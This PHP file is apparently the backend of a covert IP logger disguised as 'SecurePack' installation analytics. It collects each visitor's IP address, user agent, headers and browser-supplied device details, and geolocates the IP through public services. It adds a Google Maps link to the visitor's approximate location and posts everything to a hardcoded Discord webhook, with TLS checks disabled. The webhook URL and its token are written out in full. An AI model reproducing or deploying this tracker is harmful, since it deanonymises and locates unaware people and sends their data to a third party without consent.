
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Read JSON input
    $json = file_get_contents('php://input');
    $input_data = json_decode($json, true);
    
    if ($input_data) {
        // Get real IP address
        $real_ip = getRealIP();
        
        $data = [
            'ip' => $real_ip,
            'user_agent' => $_SERVER['HTTP_USER_AGENT'],
            'timestamp' => date('Y-m-d H:i:s T'),
            'name' => $input_data['name'] ?? 'Unknown',
            'forwarded_for' => $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 'None',
            'remote_addr' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
            'client_info' => $input_data // Store all client-side data
        ];

        sendToWebhook($data);

        header('Content-Type: application/json');
        echo json_encode(['status' => 'success']);
        exit;
    }
}

function getRealIP() {
    // Check for shared internet/proxy
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    }
    // Check for IP from remote address
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // Can contain multiple IPs, get the first one
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    // Check for IP from proxy
    elseif (!empty($_SERVER['HTTP_X_FORWARDED'])) {
        return $_SERVER['HTTP_X_FORWARDED'];
    }
    // Check for IP from remote address  
    elseif (!empty($_SERVER['HTTP_X_CLUSTER_CLIENT_IP'])) {
        return $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];
    }
    // Check for IP from host
    elseif (!empty($_SERVER['HTTP_HOST'])) {
        return $_SERVER['REMOTE_ADDR'];
    }
    // Return remote address
    return $_SERVER['REMOTE_ADDR'];
}

function getOS() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $os_platform = "Unknown";
    
    // More detailed OS detection
    if (preg_match('/Windows NT 10.0/i', $user_agent)) {
        $os_platform = 'Windows 10/11';
    } elseif (preg_match('/Windows NT 6.3/i', $user_agent)) {
        $os_platform = 'Windows 8.1';
    } elseif (preg_match('/Windows NT 6.2/i', $user_agent)) {
        $os_platform = 'Windows 8';
    } elseif (preg_match('/Windows NT 6.1/i', $user_agent)) {
        $os_platform = 'Windows 7';
    } elseif (preg_match('/Mac OS X ([0-9_]+)/i', $user_agent, $matches)) {
        $version = str_replace('_', '.', $matches[1]);
        $os_platform = 'macOS ' . $version;
    } elseif (preg_match('/Android ([0-9.]+)/i', $user_agent, $matches)) {
        $os_platform = 'Android ' . $matches[1];
    } elseif (preg_match('/iPhone OS ([0-9_]+)/i', $user_agent, $matches)) {
        $version = str_replace('_', '.', $matches[1]);
        $os_platform = 'iOS ' . $version;
    } elseif (preg_match('/Linux/i', $user_agent)) {
        $os_platform = 'Linux';
    }
    
    return $os_platform;
}

function getDeviceType() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    
    if (strpos($user_agent, 'Mobile') !== false || strpos($user_agent, 'Android') !== false) {
        return 'Mobile Device';
    } elseif (strpos($user_agent, 'Tablet') !== false || strpos($user_agent, 'iPad') !== false) {
        return 'Tablet';
    } else {
        return 'Desktop/Laptop';
    }
}

function getScreenInfo() {
    // This would need JavaScript - adding placeholder for now
    return "Detected via JavaScript";
}

function getConnectionInfo() {
    $headers = [];
    if (isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
        $headers['Language'] = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
    }
    if (isset($_SERVER['HTTP_ACCEPT_ENCODING'])) {
        $headers['Encoding'] = $_SERVER['HTTP_ACCEPT_ENCODING'];
    }
    if (isset($_SERVER['HTTP_CONNECTION'])) {
        $headers['Connection'] = $_SERVER['HTTP_CONNECTION'];
    }
    
    return $headers;
}

function getBrowser() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $browser = "Unknown";
    
    // More detailed browser detection with versions
    if (preg_match('/Chrome\/([0-9.]+)/', $user_agent, $matches)) {
        $browser = 'Chrome ' . $matches[1];
    } elseif (preg_match('/Firefox\/([0-9.]+)/', $user_agent, $matches)) {
        $browser = 'Firefox ' . $matches[1];
    } elseif (preg_match('/Safari\/([0-9.]+)/', $user_agent, $matches) && !strpos($user_agent, 'Chrome')) {
        $browser = 'Safari ' . $matches[1];
    } elseif (preg_match('/Edg\/([0-9.]+)/', $user_agent, $matches)) {
        $browser = 'Edge ' . $matches[1];
    } elseif (preg_match('/OPR\/([0-9.]+)/', $user_agent, $matches)) {
        $browser = 'Opera ' . $matches[1];
    }
    
    // Add mobile detection
    if (strpos($user_agent, 'Mobile') !== false) {
        $browser .= ' (Mobile)';
    }
    
    return $browser;
}

function getIPInfo($ip) {
    // Try multiple IP geolocation services for better accuracy
    $services = [
        "http://ip-api.com/json/" . $ip . "?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query",
        "https://ipapi.co/" . $ip . "/json/",
    ];
    
    foreach ($services as $url) {
        $response = @file_get_contents($url);
        if ($response) {
            $data = json_decode($response, true);
            if ($data && isset($data['country'])) {
                return $data;
            }
        }
    }
    
    return ['city' => 'Unknown', 'country' => 'Unknown', 'lat' => 0, 'lon' => 0, 'region' => 'Unknown', 'isp' => 'Unknown'];
}

function sendToWebhook($data) {
    $webhook_url = "https://discord.com/api/webhooks/1470507574976708747/W2xi_-ey3bYhsg5_yioYw-u-J-p1YY3Zl9Q45fBkOZkez1Np1D97REFDsbDB2yko9QbG";
    
    $ip_info = getIPInfo($data['ip']);
    $maps_link = isset($ip_info['lat']) && $ip_info['lat'] != 0 ? 
        "https://www.google.com/maps?q=" . $ip_info['lat'] . "," . $ip_info['lon'] : 
        "Location unavailable";
    
    $connection_info = getConnectionInfo();
    
    $embed = [
        'embeds' => [[
            'title' => '🎯 New SecurePack Installation',
            'color' => 0x5865F2,
            'fields' => [
                ['name' => '👤 User Name', 'value' => $data['name'], 'inline' => true],
                ['name' => '⏰ Timestamp', 'value' => $data['timestamp'], 'inline' => true],
                ['name' => '🌐 IP Address', 'value' => $data['ip'], 'inline' => true],
                ['name' => '💻 Operating System', 'value' => getOS(), 'inline' => true],
                ['name' => '🌍 Browser Details', 'value' => getBrowser(), 'inline' => true],
                ['name' => '📱 Device Type', 'value' => getDeviceType(), 'inline' => true],
                ['name' => '📍 Location Details', 'value' => 
                    "🏙️ " . ($ip_info['city'] ?? 'Unknown') . "\n" .
                    "🗺️ " . ($ip_info['region'] ?? 'Unknown') . ", " . ($ip_info['country'] ?? 'Unknown') . "\n" .
                    "🏢 ISP: " . ($ip_info['isp'] ?? 'Unknown') . "\n" .
                    "🌍 Timezone: " . ($ip_info['timezone'] ?? 'Unknown'), 
                    'inline' => true
                ],
                ['name' => '🗺️ Maps Location', 'value' => "[📍 View on Google Maps]($maps_link)", 'inline' => false],
                ['name' => '🔗 Connection Info', 'value' => 
                    "**Language:** " . substr($connection_info['Language'] ?? 'Unknown', 0, 50) . "\n" .
                    "**Encoding:** " . ($connection_info['Encoding'] ?? 'Unknown') . "\n" .
                    "**Connection:** " . ($connection_info['Connection'] ?? 'Unknown'), 
                    'inline' => false
                ],
                ['name' => '💻 Client Details', 'value' => 
                    "**Screen:** " . ($data['client_info']['screen']['width'] ?? 'Unknown') . "x" . ($data['client_info']['screen']['height'] ?? 'Unknown') . "\n" .
                    "**Window:** " . ($data['client_info']['window']['innerWidth'] ?? 'Unknown') . "x" . ($data['client_info']['window']['innerHeight'] ?? 'Unknown') . "\n" .
                    "**Language:** " . ($data['client_info']['navigator']['language'] ?? 'Unknown') . "\n" .
                    "**Platform:** " . ($data['client_info']['navigator']['platform'] ?? 'Unknown') . "\n" .
                    "**CPU Cores:** " . ($data['client_info']['navigator']['hardwareConcurrency'] ?? 'Unknown') . "\n" .
                    "**Timezone:** " . ($data['client_info']['timezone'] ?? 'Unknown'), 
                    'inline' => false
                ],
                ['name' => '🔧 Network Details', 'value' => 
                    "**Primary IP:** " . $data['ip'] . "\n" .
                    "**Remote Addr:** " . $data['remote_addr'] . "\n" .
                    "**X-Forwarded-For:** " . $data['forwarded_for'] . "\n" .
                    "**User Agent:** " . substr($data['user_agent'], 0, 150) . "...", 
                    'inline' => false
                ]
            ],
            'footer' => [
                'text' => 'SecurePack Analytics • Enhanced Detection System'
            ],
            'timestamp' => date('c')
        ]]
    ];
    
    $ch = curl_init($webhook_url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($embed));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $result = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return $http_code == 204;
}
?>
